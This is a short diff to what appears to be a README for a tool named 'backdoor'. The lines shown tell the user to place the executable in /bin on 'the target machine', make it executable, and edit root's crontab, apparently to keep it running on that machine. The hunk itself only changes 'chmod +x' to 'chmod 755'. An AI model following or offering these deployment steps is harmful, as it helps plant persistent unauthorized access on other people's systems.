@@ -38,7 +38,7 @@ python3 -m pip install cryptography
 
 Place the 'backdoor' executable in the /bin directory of the target machine.
 
-Run **_chmod +x backdoor_** to give execute permissions.
+Run **_chmod 755 backdoor_** to give execute permissions.
 
 Run the command **_sudo crontab -e_**
 
